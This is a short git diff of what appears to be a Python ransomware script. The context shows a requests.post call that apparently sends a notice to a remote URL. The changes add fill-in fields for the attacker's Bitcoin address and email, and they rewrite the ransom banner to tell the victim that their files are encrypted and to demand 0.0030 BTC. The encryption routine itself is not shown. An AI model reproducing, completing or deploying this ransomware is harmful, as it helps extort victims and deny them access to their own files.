@@ -39,25 +39,32 @@ Time ~> {nowt}```"""
 
 r=requests.post(url, data={"content": x})
 
-
-
+btc_addr="" ### Enter your BITCOIN ADDRESS in the Quotes
+ur_email="" ### Enter your Email
 ### Beginning encryption 
-print("""
+print(f"""
  
- ██╗    ██╗ █████╗ ██████╗ ███╗   ██╗██╗███╗   ██╗ ██████╗     ██╗
- ██║    ██║██╔══██╗██╔══██╗████╗  ██║██║████╗  ██║██╔════╝     ██║
- ██║ █╗ ██║███████║██████╔╝██╔██╗ ██║██║██╔██╗ ██║██║  ███╗    ██║
- ██║███╗██║██╔══██║██╔══██╗██║╚██╗██║██║██║╚██╗██║██║   ██║    ╚═╝
- ╚███╔███╔╝██║  ██║██║  ██║██║ ╚████║██║██║ ╚████║╚██████╔╝    ██╗
-  ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝╚═╝  ╚═══╝ ╚═════╝     ╚═╝
+         __          __              _             _ 
+         \ \        / /             (_)           | |
+          \ \  /\  / /_ _ _ __ _ __  _ _ __   __ _| |
+           \ \/  \/ / _` | '__| '_ \| | '_ \ / _` | |
+            \  /\  / (_| | |  | | | | | | | | (_| |_|
+             \/  \/ \__,_|_|  |_| |_|_|_| |_|\__, (_)
+                                              __/ |  
+                                             |___/   
              ___________________________________
             [You're Computer has been fucked lol]                                           
             [Your files are Encrypted hahaha cry]              
             [So, if you feel like getting your  ]
             [files back send me [0.0030 BITCOIN]]
-             -----------------------------------                                        
-                          
-""")
+             ----------------------------------- 
+          Send Bitcoin to my address [ {btc_addr} ] 
+             ---------------------------------
+      After you sent the Bitcoin send an Eamil to [ {ur_email} ] 
+             
+             
+             """)
+
 wr=("lol hi")
 with open("decrypt.txt", "w+") as f:
     f.write(wr)
